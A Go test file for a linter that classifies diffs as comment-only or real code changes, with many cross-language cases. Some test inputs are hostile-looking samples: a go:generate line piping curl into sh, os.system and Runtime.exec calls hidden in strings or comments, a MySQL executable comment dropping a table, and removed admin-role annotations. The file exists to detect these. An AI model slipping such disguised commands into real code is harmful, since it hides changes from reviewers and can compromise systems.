package lint

import (
	"strings"
	"testing"
)

func ln(xs ...string) string { return strings.Join(xs, "\n") + "\n" }

// Code the comment lexer could take for a comment, or comments that a
// compiler, interpreter or tool reads: never a trivial change.
func TestCompareCodeFailClosed(t *testing.T) {
	for _, tc := range []struct{ name, path, before, after string }{
		// Python strings that start a line but are not docstrings.
		{"py sql argument (gate probe)", "q.py",
			ln("rows = db.execute(", `    """SELECT * FROM users WHERE tenant_id = %s""",`, "    (tid,),", ")"),
			ln("rows = db.execute(", `    """SELECT * FROM users""",`, "    (tid,),", ")")},
		{"py sql argument in def", "repo.py",
			ln("def users(db, tid):", "    return db.execute(", `        """SELECT * FROM users WHERE tenant_id = %s""",`, "        (tid,),", "    )"),
			ln("def users(db, tid):", "    return db.execute(", `        """SELECT * FROM users""",`, "        (tid,),", "    )")},
		{"py f-string argument", "a.py", ln("log(", `    f"""user {u.id}"""`, ")"), ln("log(", `    f"""user {u.name}"""`, ")")},
		{"py standalone f-string", "a.py", ln("def f():", `    f"""{os.system('id')}"""`), ln("def f():", `    f"""{os.system('rm')}"""`)},
		{"py b-string argument", "a.py", ln("send(", `    b"""PING"""`, ")"), ln("send(", `    b"""KILL"""`, ")")},
		{"py r-string in list", "a.py", ln("PATS = [", `    r"""^a$""",`, "]"), ln("PATS = [", `    r"""^b$""",`, "]")},
		{"py backslash continuation", "a.py", ln("q = \\", `    """SELECT 1"""`), ln("q = \\", `    """DROP TABLE t"""`)},
		{"py multi-line argument", "a.py",
			ln("cur.execute(", `    """`, "    SELECT * FROM t WHERE owner = %s", `    """, (u,))`),
			ln("cur.execute(", `    """`, "    SELECT * FROM t", `    """, (u,))`)},
		{"py docstring used as value", "a.py", ln(`"""a {x}"""  .format(x=1)`), ln(`"""a {y}"""  .format(x=1)`)},
		{"py multi-line docstring used as value", "a.py", ln(`"""`, "a {x}", `""".format(x=1)`), ln(`"""`, "a {y}", `""".format(x=1)`)},
		{"py string whitespace", "a.py", ln("run(", `    """a  b"""`, ")"), ln("run(", `    """a b"""`, ")")},
		{"py doctest", "a.py", ln("def f():", `    """Square.`, "", "    >>> f(2)", "    4", `    """`), ln("def f():", `    """Square.`, "", "    >>> f(2)", "    5", `    """`)},
		{"py type comment", "a.py", ln("x = []  # type: List[int]"), ln("x = []  # type: List[str]")},
		{"py type ignore added", "a.py", ln("x = f()"), ln("x = f()  # type: ignore")},
		{"py noqa", "a.py", ln("import os"), ln("import os  # noqa: F401")},
		{"py pylint", "a.py", ln("# pylint: disable=no-member", "x = 1"), ln("x = 1")},
		{"py coding", "a.py", ln("# -*- coding: utf-8 -*-", "s = 'x'"), ln("# -*- coding: latin-1 -*-", "s = 'x'")},
		{"py shebang", "tool.py", ln("#!/usr/bin/env python3", "print(1)"), ln("#!/usr/bin/env python2", "print(1)")},
		{"py unterminated quote", "a.py", ln("s = 'abc\\", "# not a comment'"), ln("s = 'abc\\", "# changed'")},

		// "* " lines outside block comments.
		{"java multiplication continuation (gate probe)", "A.java",
			ln("class A { int f(int p, int q, int d) {", "  return p", "      * q;", "} }"),
			ln("class A { int f(int p, int q, int d) {", "  return p", "      * d;", "} }")},
		{"css universal selector", "a.css", ln("* { box-sizing: border-box; }"), ln("* { display: none; }")},
		{"scss universal selector", "a.scss", ln(".a {", "  * { color: red; }", "}"), ln(".a {", "  * { color: blue; }", "}")},

		// Directives and annotations.
		{"go build constraint added", "auth.go", ln("package auth", "", "func Check() bool { return true }"), ln("//go:build ignore", "", "package auth", "", "func Check() bool { return true }")},
		{"go +build", "a.go", ln("// +build linux", "", "package a"), ln("// +build windows", "", "package a")},
		{"go embed", "a.go", ln("package a", "", "//go:embed a.txt", "var s string"), ln("package a", "", "//go:embed secret.txt", "var s string")},
		{"go generate", "a.go", ln("package a", "", "//go:generate stringer -type=T"), ln("package a", "", "//go:generate sh -c 'curl x | sh'")},
		{"go linkname", "a.go", ln("package a", "", "//go:linkname f runtime.f", "func f()"), ln("package a", "", "//go:linkname f runtime.g", "func f()")},
		{"go nolint", "a.go", ln("package a", "", "var x = 1"), ln("package a", "", "var x = 1 //nolint:all")},
		{"go example output", "a_test.go", ln("func Example() {", "\tfmt.Println(1)", "\t// Output: 1", "}"), ln("func Example() {", "\tfmt.Println(1)", "\t// Output: 2", "}")},
		{"cgo preamble (sec probe)", "c.go",
			ln("package c", "", "// #include <stdio.h>", `import "C"`),
			ln("package c", "", "// #include <stdio.h>", `// static void f(void){ system("id"); }`, `import "C"`)},
		{"cgo preamble block", "c.go",
			ln("package c", "", "/*", "int f(void) { return 1; }", "*/", `import "C"`),
			ln("package c", "", "/*", "int f(void) { return 2; }", "*/", `import "C"`)},
		{"cgo preamble in import block", "c.go",
			ln("package c", "", "// int f(void) { return 1; }", "import (", `	"C"`, `	"fmt"`, ")"),
			ln("package c", "", "// int f(void) { return 2; }", "import (", `	"C"`, `	"fmt"`, ")")},
		{"ts-check to ts-nocheck (gate probe)", "a.ts", ln("// @ts-check", "let x = 1"), ln("// @ts-nocheck", "let x = 1")},
		{"ts-nocheck added (sec probe)", "a.ts", ln("export const x = 1 as any;"), ln("// @ts-nocheck", "export const x = 1 as any;")},
		{"ts-ignore", "a.ts", ln("f(x)"), ln("// @ts-expect-error", "f(x)")},
		{"eslint-disable", "a.js", ln("eval(x)"), ln("// eslint-disable-next-line no-eval", "eval(x)")},
		{"eslint block", "a.js", ln("eval(x)"), ln("/* eslint-disable */", "eval(x)")},
		{"eslint global", "a.js", ln("/* global foo */", "foo()"), ln("/* global bar */", "foo()")},
		{"triple-slash reference", "a.ts", ln(`/// <reference path="a.d.ts" />`, "x()"), ln(`/// <reference path="b.d.ts" />`, "x()")},
		{"webpack magic comment", "a.js", ln(`import(/* webpackChunkName: "a" */ "./x")`), ln(`import(/* webpackChunkName: "b" */ "./x")`)},
		{"pure annotation", "a.js", ln("const a = f()"), ln("const a = /*#__PURE__*/ f()")},
		{"jsdoc type", "a.js", ln("/** @type {number} */", "let x"), ln("/** @type {string} */", "let x")},
		{"php docblock annotation removed (sec probe)", "Ctl.php",
			ln("<?php", "class A {", " /**", `  * @IsGranted("ROLE_ADMIN")`, "  */", " public function x() {}", "}"),
			ln("<?php", "class A {", " /**", "  */", " public function x() {}", "}")},
		{"php multi-line annotation argument", "Ctl.php",
			ln("<?php", "class A {", " /**", "  * @Route(", `  *   "/admin",`, `  *   methods={"GET"}`, "  * )", "  */", " public function x() {}", "}"),
			ln("<?php", "class A {", " /**", "  * @Route(", `  *   "/public",`, `  *   methods={"GET"}`, "  * )", "  */", " public function x() {}", "}")},
		{"php 8 attribute", "Ctl.php", ln("<?php", "#[IsGranted('ROLE_ADMIN')]", "function x() {}"), ln("<?php", "#[IsGranted('ROLE_USER')]", "function x() {}")},
		{"annotation inside a docblock line", "Ctl.php", ln("<?php", `/** Admin only. @IsGranted("ROLE_ADMIN") */`, "function x() {}"), ln("<?php", "/** Admin only. */", "function x() {}")},
		{"java annotation in javadoc", "A.java", ln("/**", " * Does x.", " * @deprecated", " */", "void x() {}"), ln("/**", " * Does x.", " */", "void x() {}")},
		{"java unicode newline in comment", "A.java", ln("class A {", "  // note", "}"), ln("class A {", "  // note \\u000a Runtime.getRuntime().exec(\"id\");", "}")},
		{"c line splice", "a.c", ln("// note", "free(p);"), ln("// note \\", "free(p);")},
		{"dockerfile syntax (sec probe)", "Dockerfile", ln("FROM alpine"), ln("# syntax=evil/frontend:1", "FROM alpine")},
		{"dockerfile escape", "Dockerfile", ln("# escape=\\", "FROM alpine"), ln("# escape=`", "FROM alpine")},
		{"dockerfile inline hash is not a comment", "Dockerfile", ln("RUN echo a # b"), ln("RUN echo a # c")},
		{"dockerfile heredoc", "Dockerfile", ln("RUN <<EOF", "# keep", "EOF"), ln("RUN <<EOF", "# drop", "EOF")},
		{"shell shebang (sec probe)", "run.sh", ln("#!/bin/sh", "echo hi"), ln("#!/usr/bin/env perl", "echo hi")},
		{"shell heredoc (gate probe)", "a.sh", ln("psql <<SQL", "# keep", "SQL"), ln("psql <<SQL", "# drop", "SQL")},
		{"shell quoted heredoc", "a.sh", ln("cat > f <<'EOF'", "# a", "EOF"), ln("cat > f <<'EOF'", "# b", "EOF")},
		{"shell multi-line string", "a.sh", ln(`echo "a`, "# b", `"`), ln(`echo "a`, "# c", `"`)},
		{"shellcheck", "a.sh", ln("rm $x"), ln("# shellcheck disable=SC2086", "rm $x")},
		{"properties inline hash", "app.properties", ln("url=http://a # x"), ln("url=http://a # y")},
		{"gitignore inline hash", ".gitignore", ln("secret #1"), ln("secret #2")},
		{"ruby frozen string literal", "a.rb", ln("# frozen_string_literal: true", "s = 'x'"), ln("# frozen_string_literal: false", "s = 'x'")},
		{"ruby heredoc", "a.rb", ln("q = <<~SQL", "  # a", "SQL"), ln("q = <<~SQL", "  # b", "SQL")},
		{"ruby data section", "a.rb", ln("puts DATA.read", "__END__", "# a"), ln("puts DATA.read", "__END__", "# b")},
		{"php heredoc", "a.php", ln("<?php", "$q = <<<SQL", "# a", "SQL;"), ln("<?php", "$q = <<<SQL", "# b", "SQL;")},
		{"php inline html", "a.php", ln("<?php $x = 1; ?>", "<p>use # to start</p>"), ln("<?php $x = 1; ?>", "<p>use # to stop</p>")},
		{"hcl heredoc", "main.tf", ln("x = <<EOT", "# a", "EOT"), ln("x = <<EOT", "# b", "EOT")},
		{"lua long string", "a.lua", ln("s = [[", "-- a", "]]"), ln("s = [[", "-- b", "]]")},
		{"nix indented string", "a.nix", ln("x = ''", "  # a", "'';"), ln("x = ''", "  # b", "'';")},
		{"sql mysql executable comment", "m.sql", ln("SELECT 1;", "/*!50000 SELECT 2 */;"), ln("SELECT 1;", "/*!50000 DROP TABLE users */;")},
		{"sql optimizer hint", "m.sql", ln("SELECT /*+ INDEX(t a) */ * FROM t;"), ln("SELECT /*+ INDEX(t b) */ * FROM t;")},
		{"sql double minus", "m.sql", ln("SELECT 1--1;"), ln("SELECT 1--2;")},
		{"sql dollar quote", "m.sql", ln("SELECT $$ -- a $$;"), ln("SELECT $$ -- b $$;")},
		{"sql goose", "m.sql", ln("-- +goose Up", "SELECT 1;"), ln("-- +goose Down", "SELECT 1;")},
		{"sql sqlc", "q.sql", ln("-- name: GetUser :one", "SELECT 1;"), ln("-- name: GetUser :many", "SELECT 1;")},
		{"js regex with slashes", "a.js", ln(`s.replace(/a\//g, "")`), ln(`s.replace(/a\//gi, "")`)},
		{"js regex then code", "a.js", ln(`n = /x\// * a`), ln(`n = /x\// * b`)},
		{"js multi-line string", "a.js", ln("s = 'a\\", "// b'"), ln("s = 'a\\", "// c'")},
		{"jsx text", "a.jsx", ln("const A = () => <p>a // b</p>"), ln("const A = () => <p>a // c</p>")},
		{"java text block", "A.java", ln(`String q = """`, "  SELECT 1 // a", `  """;`), ln(`String q = """`, "  SELECT 1 // b", `  """;`)},
		{"rust raw string", "a.rs", ln(`let s = r#"a " // b"#;`), ln(`let s = r#"a " // c"#;`)},
		{"rust lifetime and string", "a.rs", ln(`fn f<'a>(x: &'a str) -> &'a str { "it's // a" }`), ln(`fn f<'a>(x: &'a str) -> &'a str { "it's // b" }`)},
		{"rust doc test", "a.rs", ln("/// ```", "/// assert_eq!(f(), 1);", "/// ```", "fn f() {}"), ln("/// ```", "/// assert_eq!(f(), 2);", "/// ```", "fn f() {}")},
		{"kubebuilder marker", "types.go", ln("type S struct {", "\tA int", "}"), ln("type S struct {", "\t// +kubebuilder:validation:Required", "\tA int", "}")},
		{"haskell operator", "a.hs", ln("x = a --> b"), ln("x = a --> c")},
		{"haskell pragma", "a.hs", ln("{-# LANGUAGE Safe #-}", "x = 1"), ln("{-# LANGUAGE Unsafe #-}", "x = 1")},
		{"erlang char literal", "a.erl", ln("f($% ) -> a."), ln("f($% ) -> b.")},
		{"yaml block scalar", "ci.yml", ln("run: |", "  # a", "  echo hi"), ln("run: |", "  # b", "  echo hi")},
		{"yaml block scalar with comment", "ci.yml", ln("run: >- # x", "  # a"), ln("run: >- # x", "  # b")},
		{"yaml block scalar in list", "ci.yml", ln("- name: x", "  run: |", "    # a", "", "    echo"), ln("- name: x", "  run: |", "    # b", "", "    echo")},
		{"yaml multi-line quoted", "ci.yml", ln(`a: "x`, "  # a", `  z"`), ln(`a: "x`, "  # b", `  z"`)},
		{"yaml schema", "ci.yml", ln("a: 1"), ln("# yaml-language-server: $schema=x", "a: 1")},
		{"html script comment", "a.html", ln("<script>", "<!--", "alert(1)", "//-->", "</script>"), ln("<script>", "<!--", "alert(2)", "//-->", "</script>")},
		{"html conditional comment", "a.html", ln("<!--[if IE]><script src=a.js></script><![endif]-->"), ln("<!--[if IE]><script src=b.js></script><![endif]-->")},
		{"html ssi", "a.html", ln("<!--#include virtual=\"a\" -->"), ln("<!--#include virtual=\"b\" -->")},
		{"twig html comment executes", "a.twig", ln("<!-- {{ a() }} -->"), ln("<!-- {{ b() }} -->")},
		{"vue template text", "A.vue", ln("<template><p>a // b</p></template>"), ln("<template><p>a // c</p></template>")},
		{"tex url", "a.tex", ln(`\url{http://x/a%20b}`), ln(`\url{http://x/a%20c}`)},
		{"unclosed block comment", "a.go", ln("x := 1", "/* a"), ln("x := 1", "/* b")},
		{"unclosed python bracket", "a.py", ln("f(", "# a"), ln("f(", "# b")},
		{"yaml keep chomping blank line", "ci.yml", ln("a: |+", "  x", "", "b: 1"), ln("a: |+", "  x", "", "", "b: 1")},
		{"cmake bracket argument", "CMakeLists.txt", ln("set(x [[", "# a", "]])"), ln("set(x [[", "# b", "]])")},
	} {
		if got := CompareCode(tc.path, []byte(tc.before), []byte(tc.after)); got != CodeChanged {
			t.Errorf("%s: got %d, want CodeChanged", tc.name, got)
		}
	}
}

// What stays trivial: plain prose comments in clearly lexed code, and
// formatting.
func TestCompareCodeStillTrivial(t *testing.T) {
	for _, tc := range []struct {
		name, path, before, after string
		want                      CodeDiff
	}{
		{"go comment", "a.go", ln("package a", "", "// F does x.", "func F() {}"), ln("package a", "", "// F does y.", "func F() {}"), CodeComments},
		{"go comment beside a directive group", "a.go", ln("// Copyright 1", "", "//go:build linux", "", "package a"), ln("// Copyright 2", "", "//go:build linux", "", "package a"), CodeComments},
		{"go todo", "a.go", ln("x := 1"), ln("x := 1 // TODO(PRJ-1): tune"), CodeComments},
		{"go docblock", "a.go", ln("/*", " * Old.", " */", "x := 1"), ln("/*", " * New words.", " */", "x := 1"), CodeComments},
		{"java javadoc prose", "A.java", ln("/**", " * Does x.", " */", "void x() {}"), ln("/**", " * Does x and y.", " */", "void x() {}"), CodeComments},
		{"css comment", "a.css", ln("/* old */", "a { color: red; }"), ln("/* new */", "a { color: red; }"), CodeComments},
		{"css star in a comment", "a.css", ln("/*", " * old", " */", "* { margin: 0 }"), ln("/*", " * new", " */", "* { margin: 0 }"), CodeComments},
		{"py module docstring", "a.py", ln(`"""Old."""`, "import os"), ln(`"""New."""`, "import os"), CodeComments},
		{"py function docstring", "a.py", ln("def f(a,", "      b):", `    """Old.`, "", "    Returns:", "        x.", `    """`, "    return a"), ln("def f(a,", "      b):", `    """New.`, "", "    Returns:", "        y.", `    """`, "    return a"), CodeComments},
		{"py class docstring after a call", "a.py", ln("x = f(", "    1)", `"""Old."""`), ln("x = f(", "    1)", `"""New."""`), CodeComments},
		{"py r docstring", "a.py", ln("def f():", `    r"""Old \d."""`), ln("def f():", `    r"""New \d."""`), CodeComments},
		{"py docstring and comment", "a.py", ln("def f():", `    """Doc."""  # old`), ln("def f():", `    """Doc."""  # new`), CodeComments},
		{"py comment", "a.py", ln("x = 1  # old"), ln("x = 1  # new"), CodeComments},
		{"py banner", "a.py", ln("## Section", "x = 1"), ln("## Other section", "x = 1"), CodeComments},
		{"py whitespace", "a.py", ln("x=1"), ln("x = 1"), CodeWhitespace},
		{"rust lifetimes", "a.rs", ln("// old", "fn f<'a>(x: &'a str) -> &'a str { x }"), ln("// new", "fn f<'a>(x: &'a str) -> &'a str { x }"), CodeComments},
		{"rust char literal", "a.rs", ln("let c = 'x'; // old"), ln("let c = 'x'; // new"), CodeComments},
		{"shell comment", "a.sh", ln("echo hi # old"), ln("echo hi # new"), CodeComments},
		{"dockerfile comment line", "Dockerfile", ln("# install deps", "RUN apk add x"), ln("# install the dependencies", "RUN apk add x"), CodeComments},
		{"yaml comment beside a block scalar", "ci.yml", ln("# old", "run: |", "  echo hi", "", "b: 1"), ln("# new", "run: |", "  echo hi", "", "b: 1"), CodeComments},
		{"yaml comment after a block scalar", "ci.yml", ln("run: |", "  echo hi", "# old", "b: 1"), ln("run: |", "  echo hi", "# new", "b: 1"), CodeComments},
		{"yaml apostrophe", "ci.yml", ln("msg: don't # x", "# old", "a: 1"), ln("msg: don't # x", "# new", "a: 1"), CodeComments},
		{"yaml quoted values", "ci.yml", ln("a: 'x'", "b: [\"y\", 'z']", "# old"), ln("a: 'x'", "b: [\"y\", 'z']", "# new"), CodeComments},
		{"html comment", "a.html", ln("<!-- old -->", "<p>x</p>"), ln("<!-- new -->", "<p>x</p>"), CodeComments},
		{"twig comment", "a.twig", ln("{# old #}", "<p>{{ x }}</p>"), ln("{# new #}", "<p>{{ x }}</p>"), CodeComments},
		{"sql comment", "m.sql", ln("-- old", "SELECT 1;"), ln("-- new", "SELECT 1;"), CodeComments},
		{"php comment", "a.php", ln("<?php", "// old", "$x = 1;"), ln("<?php", "// new", "$x = 1;"), CodeComments},
		{"ts comment", "a.ts", ln("const a = 1 // old"), ln("const a = 1 // new"), CodeComments},
		{"yaml clip blank line", "ci.yml", ln("a: |", "  x", "", "b: 1"), ln("a: |", "  x", "", "", "b: 1"), CodeWhitespace},
		{"directive whitespace only", "a.go", ln("//go:build linux", "", "package a", "var x=1"), ln("//go:build linux", "", "package a", "var x = 1"), CodeWhitespace},
	} {
		want := tc.want
		if want == 0 {
			want = CodeComments
		}
		if got := CompareCode(tc.path, []byte(tc.before), []byte(tc.after)); got != want {
			t.Errorf("%s: got %d, want %d", tc.name, got, want)
		}
	}
}
